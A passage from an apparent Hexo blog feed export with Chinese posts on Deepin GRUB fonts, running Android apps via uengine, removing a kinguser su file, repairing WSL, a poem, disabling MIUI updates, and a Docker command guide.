</code></pre>
<p>可以看到，主题里使用的是<code>Unifont Regular 16</code>字体，看名字可以知道字体大小是<code>16</code>，在4K分辨率下看起来会比较小。所以只要生成大号的字体替换这里的配置就可以了。</p>
<p>生成大号字体的命令是：</p>
<pre><code class="bash">$ sudo grub-mkfont --output=/boot/grub/themes/deepin-fallback/unifont-regular-36.pf2 --size=36 /usr/share/fonts/truetype/unifont/unifont.ttf
</code></pre>
<p>然后将主题文件中的<code>Unifont Regular 16</code>都替换为<code>Unifont Regular 36</code>，并重启电脑。可以看到，字体的确变大了。可以根据实际情况动态修改字体的大小。</p>
<h2 id="0x04-结论"><a href="#0x04-结论" class="headerlink" title="0x04 结论"></a>0x04 结论</h2><p>此方法理论上不仅可以用于Deepin系统，其它Linux系统应该也可以适用。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>deepin</tag>
        <tag>grub</tag>
      </tags>
  </entry>
  <entry>
    <title>deepin运行Android应用踩坑笔记</title>
    <url>/2021/07/24/deepin-uengine/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Deepin v20.2.2系统支持运行Android应用，于是安装了Windows/Deepin双系统后，开始了运行Android应用的踩坑之旅。以下是在这过程中的踩坑记录。</p>
<h2 id="0x01-安装uengine"><a href="#0x01-安装uengine" class="headerlink" title="0x01 安装uengine"></a>0x01 安装uengine</h2><p>Deepin中是通过一个叫uengine的工具来支持Android应用的，这是一个基于<code>anbox</code>进行二次开发而成的工具。它的基本原理是通过在Linux内核中安装Android所需要的内核模块（如：binder、ashmem等），然后运行一个Android容器而实现的。</p>
<p>安装内核模块</p>
<pre><code class="bash">$ sudo apt install uengine-modules-dkms
</code></pre>
<p>安装成功后<code>/dev</code>目录下能够找到如下两个设备：</p>
<pre><code>crw-rw-rw-   1 root root    511,   0 7月  24 17:16 binder
crw-rw-rw-   1 root root     10,  58 7月  24 17:16 ashmem
</code></pre><p>如果没有看到可以尝试以下方法来手动加载：</p>
<pre><code class="bash">$ sudo insmod ashmem_linux
$ sudo insmod binder_linux
</code></pre>
<p>如果加载失败可以试下重启电脑后再加载。</p>
<p>安装uengine</p>
<pre><code class="bash">$ sudo apt install uengine
</code></pre>
<p>安装之后会创建两个服务：<code>uengine-session</code>和<code>uengine-container</code>，同时在<code>/data/uengine</code>目录下写入Android镜像等文件。如果<code>/data</code>挂载的是<code>ntfs</code>分区的话，需要将<code>/data/uengine</code>软链到非<code>ntfs</code>分区目录，否则会导致容器启动失败。</p>
<p>安装之后也会新增一个网卡：<code>uengine0</code>，分配的ip地址是：<code>192.168.250.1</code>。</p>
<p>容器成功启动后会分配到<code>192.168.250.2</code>这个地址，并且这个地址是可以ping通的。</p>
<p>容器启动的日志可以在：<code>/data/uengine/data/logs</code>路径下找到，在容器启动失败失败时可以根据这个日志来分析原因。</p>
<h2 id="0x02-安装Android应用"><a href="#0x02-安装Android应用" class="headerlink" title="0x02 安装Android应用"></a>0x02 安装Android应用</h2><p>安装Android应用最简单的方法是在<code>应用市场</code>里下载安装，也可以使用命令行安装。</p>
<pre><code class="bash">$ sudo apt install uengine.com.tencent.mobileqq
</code></pre>
<p>安装后会在桌面创建一个图表，指向的命令行是：<code>/usr/bin/uengine-launch.sh --action=android.intent.action.MAIN --package=com.tencent.mobileqq --component=com.tencent.mobileqq.activity.SplashActivity</code>。</p>
<p><code>/usr/bin/uengine-launch.sh</code>的内容是：</p>
<pre><code class="bash">#!/bin/bash

uengine launch $*
</code></pre>
<p>这里默认是用的多窗口模式，每个应用都是在一个新的窗口中打开的。</p>
<h2 id="0x03-使用adb访问Android系统"><a href="#0x03-使用adb访问Android系统" class="headerlink" title="0x03 使用adb访问Android系统"></a>0x03 使用adb访问Android系统</h2><p>安装adb</p>
<pre><code class="bash">$ sudo apt install adb
</code></pre>
<p>连接设备</p>
<pre><code class="bash">$ adb connect 192.168.250.2
192.168.250.2:5555      unauthorized
</code></pre>
<p>正常Android设备在连接adb调试的时候会弹出授权窗口，但是这里怎么都无法弹出授权窗口，因此需要我们手动将adb的公钥拷贝到设备的对应目录中。</p>
<pre><code class="bash">$ cp ~/.android/adbkey.pub /data/uengine/data/rootfs/data/misc/adb/adb_keys
</code></pre>
<p>重启adb server后再次连接就成功了。</p>
<h2 id="0x04-解决高分辨率电脑上显示较小问题"><a href="#0x04-解决高分辨率电脑上显示较小问题" class="headerlink" title="0x04 解决高分辨率电脑上显示较小问题"></a>0x04 解决高分辨率电脑上显示较小问题</h2><p>uengine默认使用的分辨率为：540x960，而且缩放比例是1,导致在高分辨率电脑上看起来不仅窗口小，而且字也比较小。这种情况可以通过在<code>/usr/share/uengine/appetc</code>目录下写入应用配置文件来解决。例如，对于Android QQ可以使用以下配置：</p>
<pre><code class="bash">cat com.tencent.mobileqq.txt

verticalWidth 1080
verticalHeighe 1920
horizontaltWidth 1920
horizontaltHeighe 1080
verticalScreen  1  
allowFullScreen 1 
allowScreenSwitching 1
defaultFullScreen 0

logicalDensityDpi 400
physicalDpi 72
appWidth 1080
appHeight 1920
logicalWidth 1080
logicalHeight 1920
</code></pre>
<p><code>com.tencent.mobileqq</code>要替换成实际应用的包名；<code>logicalDensityDpi</code>参数用于控制缩放比例，<code>160</code>表示没有缩放，<code>320</code>表示放大一倍。可以根据电脑实际情况修改这些参数值。</p>
<p><img src="/images/deepin-uengine-app.png" alt></p>
<h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>使用容器方式跑Android系统比虚拟机方式更节省资源，启动也更快，更接近于原生应用的体验。这种方式也会逐渐成为各大Linux系统均支持的能力，具有较大的应用潜力。</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>deepin</tag>
      </tags>
  </entry>
  <entry>
    <title>删除kinguser的su文件</title>
    <url>/2017/01/07/delete-kinguser-su/</url>
    <content><![CDATA[<p>安装kinguser后创建的su文件发现无法删除，会提示  </p>
<blockquote>
<p>rm: can\’t remove \’su\’: Operation not permitted  </p>
</blockquote>
<p>找了好久终于找到原因了<br>是这个文件设置了<em>immutable</em>属性，导致无法rm、chmod、chown<br>只要去掉这个属性就好了  </p>
<blockquote>
<p>/system/xbin # chattr -i su<br>/system/xbin # chattr -i su<br>/system/xbin # chattr -a su<br>/system/xbin # rm -f su<br>/system/xbin # rm -f su  </p>
</blockquote>
<p>使用lsattr可以查看属性</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>kinguser</tag>
      </tags>
  </entry>
  <entry>
    <title>Win10上误删Linux子系统的解决方法</title>
    <url>/2019/03/21/delete-wsl/</url>
    <content><![CDATA[<p>最近在折腾Win10里的WSL的时候，不小心把WSL的目录删除了，然后无论如何再也装不上去。运行<code>bash</code>命令会报以下错误：</p>
<pre><code class="bash">C:\&gt;bash
指定的网络名不再可用。
</code></pre>
<p>百度、Google均无解，于是想到使用英文去搜索，终于找到了下面这篇帖子：</p>
<p><a href="https://www.reddit.com/r/bashonubuntuonwindows/comments/aqeu24/i_accidentally_deleted_my_installed_wsl_folder/" target="_blank" rel="noopener">https://www.reddit.com/r/bashonubuntuonwindows/comments/aqeu24/i_accidentally_deleted_my_installed_wsl_folder/</a></p>
<p>以下是解决方法：</p>
<pre><code class="bash">C:\&gt;wslconfig /list
适用于 Linux 的 Windows 子系统:
Ubuntu-18.04 (默认)

C:\&gt;wslconfig /u Ubuntu-18.04
正在注销...

C:\&gt;wslconfig /list
适用于 Linux 的 Windows 子系统没有已安装的分发版。
可以通过访问 Microsoft Store 来安装分发版:
https://aka.ms/wslstore
</code></pre>
<p>此时，运行<code>bash</code>命令也正常了</p>
<pre><code class="bash">C:\&gt;bash
适用于 Linux 的 Windows 子系统没有已安装的分发版。
可以通过访问 Microsoft Store 来安装分发版:
https://aka.ms/wslstore
</code></pre>
<p>终于可以正常安装WSL了。</p>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>wsl</tag>
      </tags>
  </entry>
  <entry>
    <title>蝶恋花</title>
    <url>/2017/01/14/die-nian-hua/</url>
    <content><![CDATA[<pre><code>奢梦贪杯红粉帐
绿柳烟轻 芳草佳人酿
芙晓含情春正盎 痴蝶翩舞心波漾

但恐一朝花逝往
何处温柔 恰与伊乡仿
天道难违难再望 不如依汝归虚枉
</code></pre>]]></content>
      <categories>
        <category>诗词</category>
      </categories>
  </entry>
  <entry>
    <title>MIUI关闭系统自动升级</title>
    <url>/2017/01/07/disable-miui-update/</url>
    <content><![CDATA[<p>&emsp;&emsp;这几天手机老是自动更新到MIUI v6，但是我又不喜欢v6，只好降级，结果降级后又自动升级，只好研究了下禁止升级的方法。<br>&emsp;&emsp;结果发现只能卸载<strong>/system/app/Updater.apk</strong>，不然就算禁止“系统更新”联网也没用，它还是会偷偷下载新版本，然后提示重启升级。此时千万不能重启，要进到recovery里，选择另外一个系统（不显示“最近”的系统），进去，这样进到的还是旧系统。因为MIUI会将新版本放到新系统里，重启后自动进的就是新系统（这也是双系统的好处）。<br>&emsp;&emsp;如果不小心进到新系统里升级了，也不要紧，重启到recovery，清除用户数据，再重启到旧系统就可以了。然后一定要卸载Updater.apk。这样就不会再自动升级了。</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>miui</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker命令使用经验总结</title>
    <url>/2019/04/04/docker-command/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Docker作为现在常用的服务部署方式，日常工作中免不了要做些<code>build</code>、<code>push</code>之类的操作。为了避免每次都要查文档，这里将一些常用的命令和技巧做一些总结。</p>
<p>以下以<code>Ubuntu 16.04 x64</code>系统作为演示环境。</p>
<h2 id="0x01-环境准备"><a href="#0x01-环境准备" class="headerlink" title="0x01 环境准备"></a>0x01 环境准备</h2><h3 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h3><pre><code class="bash">$ apt install docker
$ docker --version
Docker version 18.06.1-ce, build e68fc7a
</code></pre>
<h3 id="重启docker服务"><a href="#重启docker服务" class="headerlink" title="重启docker服务"></a>重启docker服务</h3><pre><code class="bash">$ systemctl daemon-reload
$ systemctl restart docker
</code></pre>
<h3 id="设置docker代理"><a href="#设置docker代理" class="headerlink" title="设置docker代理"></a>设置docker代理</h3><p>此代理主要用于docker访问镜像仓库</p>
<p>创建配置文件：<code>/etc/systemd/system/docker.service.d/http-proxy.conf</code>，写入以下内容：</p>
<pre><code class="conf">[Service]
Environment=&quot;HTTP_PROXY=http://web-proxy.com:8080&quot; &quot;HTTPS_PROXY=http://web-proxy.com:8080&quot; &quot;NO_PROXY=internal.com&quot;
</code></pre>
<p>重启docker服务，配置生效</p>
<h2 id="0x02-编写Dockerfile"><a href="#0x02-编写Dockerfile" class="headerlink" title="0x02 编写Dockerfile"></a>0x02 编写<code>Dockerfile</code></h2><p>要编译docker镜像，需要先编写<code>Dockerfile</code>文件。以下是一个<code>Dockerfile</code>的例子：</p>
<pre><code class="docker">FROM python:2.7
# 基于python2.7镜像

RUN apt update &amp;&amp; apt install python-pip -y \
    &amp;&amp; rm -rf /var/lib/apt/lists/* \
    &amp;&amp; pip install uwsgi \
    &amp;&amp; pip install tornado \
    &amp;&amp; mkdir /data
# 编译时执行的命令，需要尽量写成一条命令

WORKDIR /data
# 设置工作目录

COPY adb /usr/bin/
# 拷贝文件
COPY api/ /data/api/
# 拷贝目录

VOLUME [&quot;/data1&quot;,&quot;/data2&quot;]
# 挂载目录

ENV TZ=&quot;Asia/Shanghai&quot;
# 设置时区

EXPOSE 80/tcp 8080/tcp
# 暴露服务端口

ENTRYPOINT sh /data/start.sh
# 指定入口命令，如果这个命令退出，docker容器也会一起退出
</code></pre>
<p>可以看出，格式还是相对比较简单的，照着例子，基本都能写出来。</p>
<h2 id="ADD与COPY指令的区别"><a href="#ADD与COPY指令的区别" class="headerlink" title="ADD与COPY指令的区别"></a>ADD与COPY指令的区别</h2><p>两者都可以用于向镜像中添加文件/目录，主要区别是：<code>COPY</code>只能添加本地文件/目录，<code>ADD</code>可以添加url指向的文件；并且，<code>ADD</code>如果指定的源地址是一个本地的<code>tar</code>文件，还会自动解压到目标目录中。</p>
<h3 id="ENTRYPOINT和CMD指令的区别"><a href="#ENTRYPOINT和CMD指令的区别" class="headerlink" title="ENTRYPOINT和CMD指令的区别"></a>ENTRYPOINT和CMD指令的区别</h3><p>两者都可以设置<code>docker run</code>的入口命令行，如果指定了多个，只有最后一个生效，两者主要区别是：如果<code>Dockerfile</code>中同时存在<code>ENTRYPOINT</code>和<code>CMD</code>，只有<code>ENTRYPOINT</code>会执行；<code>ENTRYPOINT</code>配置的命令行允许被<code>--entrypoint</code>参数覆盖，而<code>CMD</code>配置的命令行允许被启动参数覆盖。</p>
<p>因此，优先级顺序是：</p>
<p>–entrypoint &gt; ENTRYPOINT &gt; 启动参数 &gt; CMD</p>
<h3 id="HEALTHCHECK"><a href="#HEALTHCHECK" class="headerlink" title="HEALTHCHECK"></a>HEALTHCHECK</h3><p>这是<code>docker 1.12</code>新增的指令，可以用于检查容器的健康状态。</p>
<pre><code class="docker">HEALTHCHECK --interval=10s --timeout=5s --retries=3 \
  CMD curl -fs http://localhost/ || exit 1
</code></pre>
<p>上面的指令是用来检测web服务是否正常方法，如果重试5次都失败后，容器状态会变成<code>unhealthy</code>，可以使用<code>docker inspect</code>命令查看容器状态。</p>
<h3 id="ONBUILD"><a href="#ONBUILD" class="headerlink" title="ONBUILD"></a>ONBUILD</h3><p>这条指令允许在使用当前镜像作为基础镜像去构建的时候触发，也就是说，在构建当前镜像时并不会触发这条指令。</p>
<pre><code class="docker">ONBUILD COPY ./package.json /app
ONBUILD RUN [ &quot;npm&quot;, &quot;install&quot; ]
</code></pre>
<h2 id="0x03-编译镜像"><a href="#0x03-编译镜像" class="headerlink" title="0x03 编译镜像"></a>0x03 编译镜像</h2><pre><code class="bash">$ docker build -t demo . 
</code></pre>
<p>表示使用当前目录的Dockerfile构建镜像<code>demo</code>。</p>
<h3 id="指定代理"><a href="#指定代理" class="headerlink" title="指定代理"></a>指定代理</h3><p>如果要指定编译时的HTTP代理，可以使用<code>--build-arg</code>参数：</p>
<pre><code class="bash">$ docker build -t demo . --build-arg http_proxy=http://web-proxy.com:8080
</code></pre>
<h3 id="指定dns服务器"><a href="#指定dns服务器" class="headerlink" title="指定dns服务器"></a>指定dns服务器</h3><p>如果要指定编译时的dns服务器，可以修改docker的配置文件：<code>/etc/docker/daemon.json</code>，增加以下配置，并重启docker服务。</p>
<pre><code class="json">&quot;dns&quot;: [&quot;10.0.0.1&quot;]
</code></pre>
<h3 id="设置默认镜像源"><a href="#设置默认镜像源" class="headerlink" title="设置默认镜像源"></a>设置默认镜像源</h3><p>在配置文件：<code>/etc/docker/daemon.json</code>中增加以下配置项，并重启docker服务。</p>
<pre><code class="json">&quot;registry-mirrors&quot;: [&quot;https://mirror.ccs.tencentyun.com&quot;]
</code></pre>
<p>上面的镜像源是在腾讯云内部使用的镜像源地址。</p>
<h3 id="指定Dockerfile路径"><a href="#指定Dockerfile路径" class="headerlink" title="指定Dockerfile路径"></a>指定Dockerfile路径</h3><p>如果<code>Dockerfile</code>文件不在当前目录下，可以在<code>docker build</code>命令中使用<code>-f /path/to/Dockerfile</code>参数来制定<code>Dockerfile</code>文件的路径。</p>
<h3 id="查看镜像的层信息"><a href="#查看镜像的层信息" class="headerlink" title="查看镜像的层信息"></a>查看镜像的层信息</h3><pre><code class="bash">$ docker history demo
IMAGE               CREATED              CREATED BY                                      SIZE                COMMENT
9088b64a2ef3        15 seconds ago       /bin/sh -c #(nop)  ENTRYPOINT [&quot;/bin/sh&quot; &quot;-c…   0B                  
6949219d8872        16 seconds ago       /bin/sh -c #(nop)  EXPOSE 80/tcp 8080/tcp       0B                  
80ff6b9185da        16 seconds ago       /bin/sh -c #(nop)  ENV TZ=Asia/Shanghai         0B                  
d069fdc8190a        58 seconds ago       /bin/sh -c #(nop) COPY file:f005afea09a30b4d…   10B                 
a09c0e999ca0        About a minute ago   /bin/sh -c #(nop) WORKDIR /data                 0B                  
28ed536148c6        About a minute ago   |0 /bin/sh -c apt update &amp;&amp; apt install pyth…   35.4MB              
d8690ef56706        2 years ago          /bin/sh -c #(nop)  CMD [&quot;python2&quot;]              0B                  
&lt;missing&gt;           2 years ago          /bin/sh -c pip install --no-cache-dir virtua…   6.37MB              
&lt;missing&gt;           2 years ago          /bin/sh -c set -ex;   wget -O get-pip.py &#39;ht…   5.26MB              
&lt;missing&gt;           2 years ago          /bin/sh -c #(nop)  ENV PYTHON_PIP_VERSION=9.…   0B                  
&lt;missing&gt;           2 years ago          /bin/sh -c set -ex  &amp;&amp; buildDeps=&#39;   dpkg-de…   45.6MB              
&lt;missing&gt;           2 years ago          /bin/sh -c #(nop)  ENV PYTHON_VERSION=2.7.14    0B                  
&lt;missing&gt;           2 years ago          /bin/sh -c #(nop)  ENV GPG_KEY=C01E1CAD5EA2C…   0B                  
&lt;missing&gt;           2 years ago          /bin/sh -c apt-get update &amp;&amp; apt-get install…   8.67MB              
&lt;missing&gt;           2 years ago          /bin/sh -c #(nop)  ENV LANG=C.UTF-8             0B                  
&lt;missing&gt;           2 years ago          /bin/sh -c #(nop)  ENV PATH=/usr/local/bin:/…   0B                  
&lt;missing&gt;           2 years ago          /bin/sh -c set -ex;  apt-get update;  apt-ge…   324MB               
&lt;missing&gt;           2 years ago          /bin/sh -c apt-get update &amp;&amp; apt-get install…   123MB               
&lt;missing&gt;           2 years ago          /bin/sh -c set -ex;  if ! command -v gpg &gt; /…   0B                  
&lt;missing&gt;           2 years ago          /bin/sh -c apt-get update &amp;&amp; apt-get install…   44.6MB              
&lt;missing&gt;           2 years ago          /bin/sh -c #(nop)  CMD [&quot;bash&quot;]                 0B                  
&lt;missing&gt;           2 years ago          /bin/sh -c #(nop) ADD file:f1509ab9c2cd38107…   123MB               
</code></pre>
<p>使用<code>--no-trunc</code>参数可以显示完整信息</p>
<h2 id="0x04-运行容器"><a href="#0x04-运行容器" class="headerlink" title="0x04 运行容器"></a>0x04 运行容器</h2><pre><code class="bash">$ docker run -it demo bash
</code></pre>
<p>使用<code>-d</code>参数可以在后台启动容器。</p>
<h3 id="指定运行时的dns服务器"><a href="#指定运行时的dns服务器" class="headerlink" title="指定运行时的dns服务器"></a>指定运行时的dns服务器</h3><pre><code class="bash">$ docker run -i --dns=10.0.0.1 demo
</code></pre>
<h3 id="指定运行时的环境变量"><a href="#指定运行时的环境变量" class="headerlink" title="指定运行时的环境变量"></a>指定运行时的环境变量</h3><pre><code class="bash">$ docker run -i --env http_proxy=http://web-proxy.com:8080 demo
</code></pre>
<h3 id="挂载主机目录"><a href="#挂载主机目录" class="headerlink" title="挂载主机目录"></a>挂载主机目录</h3><pre><code class="bash">$ docker run -i -v /home/ubuntu/data:/data demo
</code></pre>
<p>这样可以把主机上的<code>/home/ubuntu/data</code>目录挂载到容器里的<code>/data</code>下。</p>
<h3 id="映射端口"><a href="#映射端口" class="headerlink" title="映射端口"></a>映射端口</h3><p>默认情况下无法从外部访问容器内的服务，但是可以通过在启动容器时加上<code>-p port1:port2</code>参数，将容器内的端口<code>port2</code>映射到本机的<code>port1</code>端口。</p>
<h3 id="覆盖ENTRYPOINT"><a href="#覆盖ENTRYPOINT" class="headerlink" title="覆盖ENTRYPOINT"></a>覆盖ENTRYPOINT</h3><p>使用<code>--entrypoint</code>参数可以覆盖<code>Dockerfile</code>中配置的<code>ENTRYPOINT</code>命令行，但是需要注意的是：如果需要传参的话需要写成<code>--entrypoint mongod mongo:latest --replSet rs0</code>这样的形式，也就是命令和参数是分开的。</p>
<h3 id="进入容器shell"><a href="#进入容器shell" class="headerlink" title="进入容器shell"></a>进入容器shell</h3><pre><code class="bash">$ docker ps
CONTAINER ID  IMAGE  COMMAND                       CREATED          STATUS           PORTS              NAMES
e6ae7638a58d  demo   &quot;/bin/sh -c &#39;/data/start.sh&#39;&quot; 8 seconds ago    Up 7 seconds    80/tcp, 8080/tcp   loving_neumann

$ docker exec -i -t e6ae7638a58d sh
# id
uid=0(root) gid=0(root) groups=0(root)
</code></pre>
<p>如果默认进去的不是<code>root</code>权限，可以增加<code>-u root</code>参数。</p>
<h3 id="清理磁盘空间"><a href="#清理磁盘空间" class="headerlink" title="清理磁盘空间"></a>清理磁盘空间</h3><pre><code class="bash">$ docker system prune -a -f
</code></pre>
<h2 id="0x05-登录docker仓库"><a href="#0x05-登录docker仓库" class="headerlink" title="0x05 登录docker仓库"></a>0x05 登录docker仓库</h2><h3 id="登录官方仓库"><a href="#登录官方仓库" class="headerlink" title="登录官方仓库"></a>登录官方仓库</h3><pre><code class="bash">$ docker login
Login with your Docker ID to push and pull images from Docker Hub. If you don&#39;t have a Docker ID, head over to https://hub.docker.com to create one.
Username: drunkdream
Password: 
WARNING! Your password will be stored unencrypted in /root/.docker/config.json.
Configure a credential helper to remove this warning. See
https://docs.docker.com/engine/reference/commandline/login/#credentials-store

Login Succeeded
</code></pre>
<h3 id="登录非官方仓库"><a href="#登录非官方仓库" class="headerlink" title="登录非官方仓库"></a>登录非官方仓库</h3><pre><code class="bash">$ docker login hub.tencentyun.com
Username: drunkdream
Password: 
WARNING! Your password will be stored unencrypted in /root/.docker/config.json.
Configure a credential helper to remove this warning. See
https://docs.docker.com/engine/reference/commandline/login/#credentials-store

Login Succeeded
</code></pre>
<p>如果仓库使用的不是HTTPS的443端口，需要在主机名后面加上<code>:port</code>。</p>
<p>如果提示以下错误：</p>
<pre><code>Error response from daemon: Get https://hub.private.com:8080/v2/: http: server gave HTTP response to HTTPS client
</code></pre><p>说明Server不支持HTTPS协议，需要在配置文件：<code>/etc/docker/daemon.json</code>中增加以下配置：</p>
<pre><code>&quot;insecure-registries&quot;: [&quot;hub.private.com:8080&quot;]
</code></pre><p>重启docker服务，再登录就可以了</p>
<h3 id="登录协议"><a href="#登录协议" class="headerlink" title="登录协议"></a>登录协议</h3><p>抓包可得以下结果：</p>
<pre><code class="http">GET /v2/ HTTP/1.1
Host: hub.private.com:8080
User-Agent: docker/18.06.1-ce go/go1.10.4 git-commit/e68fc7a kernel/4.10.0-28-generic os/linux arch/amd64 UpstreamClient(Docker-Client/18.06.1-ce \(linux\))
Authorization: Basic YWRtaW46YWRtaW4=
Accept-Encoding: gzip
Connection: close

HTTP/1.1 200 OK
Content-Length: 2
Content-Type: application/json; charset=utf-8
Date: Mon, 25 Feb 2019 04:09:50 GMT
Docker-Distribution-Api-Version: registry/2.0
X-Content-Type-Options: nosniff
Connection: close

{}
</code></pre>
<p>说明： docker是使用了HTTP协议的<code>Authorization</code>头进行了身份认证，很容易获取明文密码。因此，为了安全，一定要使用HTTPS协议。</p>
<h2 id="0x06-push新镜像到仓库"><a href="#0x06-push新镜像到仓库" class="headerlink" title="0x06 push新镜像到仓库"></a>0x06 push新镜像到仓库</h2><h3 id="查询镜像"><a href="#查询镜像" class="headerlink" title="查询镜像"></a>查询镜像</h3><pre><code class="bash">$ docker search python
NAME                             DESCRIPTION                                     STARS               OFFICIAL            AUTOMATED
python                           Python is an interpreted, interactive, objec…   5022                [OK]                
django                           Django is a free web application framework, …   941                 [OK]                
pypy                             PyPy is a fast, compliant alternative implem…   234                 [OK]                
kaggle/python                    Docker image for Python scripts run on Kaggle   138                                     [OK]
arm32v7/python                   Python is an interpreted, interactive, objec…   48                                      
joyzoursky/python-chromedriver   Python with Chromedriver, for running automa…   43                                      [OK]
nikolaik/python-nodejs           Python with Node.js                             40                                      [OK]
centos/python-35-centos7         Platform for building and running Python 3.5…   38                                      
circleci/python                  Python is an interpreted, interactive, objec…   37                                      
centos/python-36-centos7         Platform for building and running Python 3.6…   28                                      
hylang                           Hy is a Lisp dialect that translates express…   27                  [OK]                
arm64v8/python                   Python is an interpreted, interactive, objec…   21                                      
centos/python-27-centos7         Platform for building and running Python 2.7…   17                                      
publicisworldwide/python-conda   Basic Python environments with Conda.           6                                       [OK]
bitnami/python                   Bitnami Python Docker Image                     6                                       [OK]
dockershelf/python               Repository for docker images of Python. Test…   5                                       [OK]
i386/python                      Python is an interpreted, interactive, objec…   3                                       
centos/python-34-centos7         Platform for building and running Python 3.4…   2                                       
komand/python-plugin             DEPRECATED: Komand Python SDK                   2                                       [OK]
ppc64le/python                   Python is an interpreted, interactive, objec…   2                                       
amd64/python                     Python is an interpreted, interactive, objec…   1                                       
ccitest/python                   CircleCI test images for Python                 0                                       [OK]
s390x/python                     Python is an interpreted, interactive, objec…   0                                       
openshift/python-33-centos7      DEPRECATED: A Centos7 based Python v3.3 imag…   0                                       
saagie/python                    Repo for python jobs                            0                                       
</code></pre>
<p>如果想获取python镜像的tag列表，可以使用以下命令：</p>
<pre><code class="bash">$ wget -q https://registry.hub.docker.com/v1/repositories/python/tags -O -  | sed -e &#39;s/[][]//g&#39; -e &#39;s/&quot;//g&#39; -e &#39;s/ //g&#39; | tr &#39;}&#39; &#39;\n&#39;  | awk -F: &#39;{print $3}&#39;
</code></pre>
<h3 id="拉取镜像到本地"><a href="#拉取镜像到本地" class="headerlink" title="拉取镜像到本地"></a>拉取镜像到本地</h3><pre><code class="bash">$ docker pull python
Using default tag: latest
latest: Pulling from library/python
741437d97401: Pull complete 
34d8874714d7: Pull complete 
0a108aa26679: Pull complete 
7f0334c36886: Pull complete 
65c95cb8b3be: Pull complete 
9107d7193263: Pull complete 
dd6f212ec984: Pull complete 
43288b101abf: Pull complete 
89dd65885f16: Pull complete 
Digest: sha256:a570ef00b7348c85b546c0e67955fa3be233c27bc2379d0f87fc8e4ff25aa006
Status: Downloaded newer image for python:latest
</code></pre>
<h3 id="打标签"><a href="#打标签" class="headerlink" title="打标签"></a>打标签</h3><pre><code class="bash">$ docker tag python:latest hub.tencentyun.com/drunkdream/python:latest
</code></pre>
<p>如果要push到非官方仓库，需要在打tag时加上仓库的地址。</p>
<h3 id="push镜像到仓库"><a href="#push镜像到仓库" class="headerlink" title="push镜像到仓库"></a>push镜像到仓库</h3><pre><code class="bash">$ docker push hub.tencentyun.com/drunkdream/python:latest
The push refers to repository [hub.tencentyun.com/drunkdream/python:latest]
b2f7bd391363: Pushed 
08a5b66845ac: Pushed 
88a85bcf8170: Pushed 
65860ac81ef4: Pushed 
a22a5ac18042: Pushed 
6257fa9f9597: Pushed 
578414b395b9: Pushed 
abc3250a6c7f: Pushed 
13d5529fd232: Pushed 
latest: digest: sha256:35a3001b1defafa4611f764a9c6d07c2146aefc17be2c24ee0200fd37b19b1c7 size: 2218
</code></pre>
<h2 id="0x07-镜像导出与导入"><a href="#0x07-镜像导出与导入" class="headerlink" title="0x07 镜像导出与导入"></a>0x07 镜像导出与导入</h2><h3 id="镜像导出"><a href="#镜像导出" class="headerlink" title="镜像导出"></a>镜像导出</h3><pre><code class="bash">$ docker save -o demo.tar demo:latest
</code></pre>
<h3 id="镜像导入"><a href="#镜像导入" class="headerlink" title="镜像导入"></a>镜像导入</h3><pre><code class="bash">$ docker load -i demo.tar
</code></pre>
<h2 id="0x08-Compose"><a href="#0x08-Compose" class="headerlink" title="0x08 Compose"></a>0x08 Compose</h2><p><code>Compose</code>项目是Docker官方的开源项目，实现了对Docker容器集群的快速编排。从功能上看，跟OpenStack中的Heat十分类似。</p>
<p>其代码在<a href="https://github.com/docker/compose" target="_blank" rel="noopener">https://github.com/docker/compose</a>上开源。</p>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><pre><code class="bash">$ pip install docker-compose
</code></pre>
<h3 id="编写docker-compose-yml"><a href="#编写docker-compose-yml" class="headerlink" title="编写docker-compose.yml"></a>编写docker-compose.yml</h3><p>这个文件描述了容器之间的关系。</p>
<pre><code class="yaml">version: &#39;3&#39;
services:

  webapp:
    build: . 
    # Dockerfile所在目录
    dockerfile: Dockerfile
    # Dockerfile 文件名
    command: echo &quot;hello world&quot;
    # 覆盖容器启动后的默认命令
    depends_on:
      - db
      - redis
    # 服务依赖
    dns:
      - 8.8.8.8
      - 114.114.114.114
    # 配置DNS
    env_file: .env
    # 指定环境变量文件
    environment:
      - DEBUG=1
    # 设置环境变量
    expose:
      - &quot;8080&quot;
    # 暴露端口，只在服务间被访问
    extra_hosts:
      - &quot;www.drunkdream.com:1.1.1.1&quot;
    # 添加额外hosts
    healthcheck:
      test: [&quot;CMD&quot;, &quot;curl&quot;, &quot;-f&quot;, &quot;http://localhost&quot;]
      interval: 10s
      timeout: 5s
      retries: 3
    # 健康检查
    image: ubuntu
    # 指定镜像
    ports:
      - &quot;80&quot;
      - &quot;8080:80&quot;
      - &quot;127.0.0.1:8001:8001&quot;
    # 映射端口，格式为：HOST:CONTAINER
    volumes:
      - &quot;/localhost/postgres.sock:/var/run/postgres/postgres.sock&quot;
      - &quot;/localhost/data:/var/lib/postgresql/data&quot;
    # 磁盘映射
    networks:
      - front-tier
      - back-tier
    # 配置网络

networks:
  front-tier:
    driver: bridge
  back-tier:
    driver: bridge
</code></pre>
<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><pre><code class="bash">$ docker-compose up
</code></pre>
<p>启动所有服务，使用<code>-d</code>参数可以在后台启动服务，<code>-f</code>参数可以指定docker-compose.yml。</p>
<pre><code class="bash">$ docker-compose down
</code></pre>
<p>停止和删除容器、网络</p>
<pre><code class="bash">$ docker-compose logs
</code></pre>
<p>查看日志</p>
<pre><code class="bash">$ docker-compose build
</code></pre>
<p>构建所有容器</p>
]]></content>
      <categories>
        <category>Docker</category>
